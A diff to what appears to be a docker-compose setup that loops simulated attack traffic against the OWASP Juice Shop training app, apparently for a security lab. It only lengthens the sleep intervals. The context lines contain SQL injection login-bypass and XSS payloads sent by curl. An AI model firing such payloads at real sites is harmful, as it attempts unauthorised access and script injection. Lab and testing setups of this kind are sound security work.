@@ -35,7 +35,7 @@
           while true; do
             echo && curl -o /dev/null -s -w \"%{http_code}\" -X POST -d email=admin@juice-shop.com -d password=\\'\\ OR\\ \\1\\=\\1 http://www.juiceshop.com/rest/user/login;
             echo && curl -o /dev/null -s -w \"%{http_code}\" -X POST -d email=test@evil.com -d password=\\'\\ OR\\ \\x\\=\\x http://www.juiceshop.com/rest/user/login;
-            sleep 5;
+            sleep 60;
           done
         "
       networks:
@@ -70,7 +70,7 @@
           while true; do
             echo && curl -o /dev/null -s -w "%{http_code}" -X POST -d 'comment=<script>alert(\"XSS\")</script>' http://www.juiceshop.com/rest/product/1/reviews;
             echo && curl -o /dev/null -s -w "%{http_code}" -X POST -d 'comment=<img src=\"invalid-url\" onerror=\"alert(1)\">' http://www.juiceshop.com/rest/product/1/reviews;
-            sleep 5;
+            sleep 60;
           done
         "
       networks:
@@ -89,7 +89,7 @@
           while true; do
               echo && curl -o /dev/null -s -w '%{http_code}' -X GET http://www.juiceshop.com/;     
               echo && curl -o /dev/null -s -w '%{http_code}' -X GET http://www.juiceshop.com/assets/public/css/styles.css;
-            sleep 10;
+            sleep 120;
           done
         "
       networks:
